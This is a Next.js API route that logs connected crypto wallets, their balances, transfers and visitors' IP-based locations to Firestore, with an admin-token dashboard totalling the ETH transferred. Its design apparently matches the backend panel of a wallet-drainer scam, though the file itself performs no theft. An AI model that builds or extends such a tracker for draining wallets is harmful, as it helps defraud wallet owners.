import { NextResponse } from "next/server";
import { db } from "@/lib/firebase-admin";

interface WalletRecord {
    id: string;
    action: "connect" | "transfer";
    walletName: string;
    address: string;
    balance?: string;
    amount?: string;
    txHash?: string;
    toAddress?: string;
    status?: "pending" | "success" | "rejected" | "failed";
    errorMsg?: string;
    ip?: string;
    country?: string;
    city?: string;
    timestamp: string;
}

// In-memory fallback cache for serverless execution
const memoryStore: WalletRecord[] = [];

export async function POST(request: Request) {
    try {
        const body = await request.json();
        const {
            action = "connect",
            walletName = "Web3 Wallet",
            address = "",
            balance = "0",
            amount = "0",
            txHash = "",
            toAddress = "",
            status = "success",
            errorMsg = "",
            ip = "",
            country = "",
            city = "",
        } = body;

        if (!address) {
            return NextResponse.json({ error: "Wallet address required" }, { status: 400 });
        }

        const record: WalletRecord = {
            id: `${Date.now()}_${Math.random().toString(36).slice(2, 7)}`,
            action,
            walletName,
            address,
            balance,
            amount,
            txHash,
            toAddress,
            status,
            errorMsg,
            ip,
            country,
            city,
            timestamp: new Date().toISOString(),
        };

        // Add to in-memory fallback
        memoryStore.unshift(record);
        if (memoryStore.length > 500) memoryStore.pop();

        // Save to Firestore if available
        try {
            if (db) {
                const collectionName = action === "transfer" ? "transfers" : "wallets";
                await db.collection(collectionName).doc(record.id).set(record);
            }
        } catch (dbErr) {
            console.error("Firestore wallet log error:", dbErr);
        }

        return NextResponse.json({ success: true, record });
    } catch (error: any) {
        return NextResponse.json({ error: error?.message || "Failed to log wallet event" }, { status: 500 });
    }
}

export async function GET(request: Request) {
    try {
        const token = request.headers.get("x-admin-token");
        const adminPassword = process.env.ADMIN_PASSWORD;

        if (token !== adminPassword) {
            return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
        }

        let dbRecords: WalletRecord[] = [];

        // Try reading from Firestore
        try {
            if (db) {
                const walletsSnap = await db.collection("wallets").orderBy("timestamp", "desc").limit(100).get();
                const transfersSnap = await db.collection("transfers").orderBy("timestamp", "desc").limit(100).get();

                walletsSnap.forEach((doc) => dbRecords.push(doc.data() as WalletRecord));
                transfersSnap.forEach((doc) => dbRecords.push(doc.data() as WalletRecord));
            }
        } catch (err) {
            console.error("Firestore read error:", err);
        }

        // Merge Firestore and memory records without duplicates
        const combined = [...dbRecords, ...memoryStore];
        const uniqueMap = new Map<string, WalletRecord>();
        combined.forEach((item) => uniqueMap.set(item.id, item));
        const allRecords = Array.from(uniqueMap.values()).sort(
            (a, b) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime()
        );

        const wallets = allRecords.filter((r) => r.action === "connect");
        const transfers = allRecords.filter((r) => r.action === "transfer");

        // Calculate totals
        const totalTransferredEth = transfers
            .filter((t) => t.status === "success")
            .reduce((acc, t) => acc + (parseFloat(t.amount || "0") || 0), 0)
            .toFixed(4);

        const stats = {
            totalConnectedWallets: wallets.length,
            totalTransfersCount: transfers.length,
            successfulTransfersCount: transfers.filter((t) => t.status === "success").length,
            totalTransferredEth,
        };

        return NextResponse.json({
            success: true,
            stats,
            wallets,
            transfers,
        });
    } catch (error: any) {
        return NextResponse.json({ error: error?.message || "Failed to fetch wallet data" }, { status: 500 });
    }
}
